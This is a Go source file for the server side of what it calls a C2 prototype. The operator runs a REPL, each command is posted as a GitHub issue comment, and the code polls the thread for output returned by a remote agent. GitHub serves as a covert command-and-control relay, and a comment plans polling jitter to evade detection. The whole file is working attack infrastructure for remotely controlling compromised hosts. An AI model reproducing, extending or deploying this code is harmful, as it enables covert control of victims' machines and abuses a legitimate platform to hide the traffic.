package server

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/kkirabo/c2prototype/ghapi"
)

const (
	// CmdPrefix marks a comment as a command from the server.
	CmdPrefix = "[CMD]"
	// OutPrefix marks a comment as output from the agent.
	OutPrefix = "[OUT]"

	// pollInterval is how often we check GitHub for new agent replies.
	// probably gonna add a random jitter
	pollInterval = 5 * time.Second

	// pollTimeout is the max wait time for an agent to respond to a command.
	pollTimeout = 2 * time.Minute
)

type Server struct {
	gh *ghapi.Client // server's github api client
}

// New creates a new Server with the given api client.
func New(gh *ghapi.Client) *Server {
	return &Server{gh: gh}
}

// StartSession opens a new GitHub issue and enters
// an interactive REPL where the operator types commands.
func (s *Server) StartSession(sessionName string) error {
	fmt.Printf("[*] Starting new session: %q\n", sessionName)

	issue, err := s.gh.CreateIssue(sessionName, "C2 session opened. Agent should poll this thread for commands.")
	if err != nil {
		return fmt.Errorf("creating session issue: %w", err)
	}

	fmt.Printf("[*] Session created → Issue #%d: %s\n", issue.Number, issue.Title)
	fmt.Printf("[*] Agents should poll: https://api.github.com/repos comments on issue #%d\n", issue.Number)
	return s.repl(issue.Number)
}

// ResumeSession attaches to an existing issue thread and continues the REPL.
func (s *Server) ResumeSession(issueNumber int) error {
	issue, err := s.gh.GetIssue(issueNumber)
	if err != nil {
		return fmt.Errorf("fetching issue #%d: %w", issueNumber, err)
	}

	fmt.Printf("[*] Resuming session → Issue #%d: %s\n", issue.Number, issue.Title)
	return s.repl(issue.Number)
}

// repl is the interactive command loop. The operator types a command, it gets
// posted as a [CMD] comment, then we poll until the agent replies with [OUT].
func (s *Server) repl(issueNumber int) error {
	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Printf("\nc2#%d> ", issueNumber)

		if !scanner.Scan() {
			break // EOF / Ctrl-D
		}

		cmd := strings.TrimSpace(scanner.Text())
		if cmd == "" {
			continue
		}
		if cmd == "exit" || cmd == "quit" {
			fmt.Println("[*] Session closed.")
			break
		}

		// Post the command as a GitHub issue comment
		comment, err := s.gh.PostComment(issueNumber, CmdPrefix+" "+cmd)
		if err != nil {
			fmt.Printf("[!] Failed to post command: %s\n", err)
			continue
		}

		fmt.Printf("[*] Command posted (comment #%d). Polling for agent response...\n", comment.ID)

		// Block and poll until the agent replies
		output, err := s.pollForResponse(issueNumber, comment.ID)
		if err != nil {
			fmt.Printf("[!] %s\n", err)
			continue
		}

		fmt.Printf("\n--- OUTPUT ---\n%s\n--------------\n", output)
	}

	return scanner.Err()
}

// pollForResponse watches the issue thread for a new [OUT] comment that appears
// after the command comment we just posted (identified by afterCommentID).
// It returns when the agent replies or when pollTimeout is exceeded.
func (s *Server) pollForResponse(issueNumber int, afterCommentID int64) (string, error) {
	timeout := time.After(pollTimeout)
	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	for {
		select { // sits frozen until either case occurs
		case <-timeout:
			return "", fmt.Errorf("timed out waiting for agent response after %s", pollTimeout)

		case <-ticker.C:
			comments, err := s.gh.GetComments(issueNumber)
			if err != nil {
				// Non-fatal: log and keep retrying
				fmt.Printf("[!] Poll error (will retry): %s\n", err)
				continue
			}

			for _, c := range comments {
				// Only look at comments posted after our [CMD] comment
				if c.ID > afterCommentID && strings.HasPrefix(c.Body, OutPrefix) {
					// Strip the [OUT] prefix before returning
					output := strings.TrimSpace(strings.TrimPrefix(c.Body, OutPrefix))
					return output, nil
				}
			}
		}
	}
}
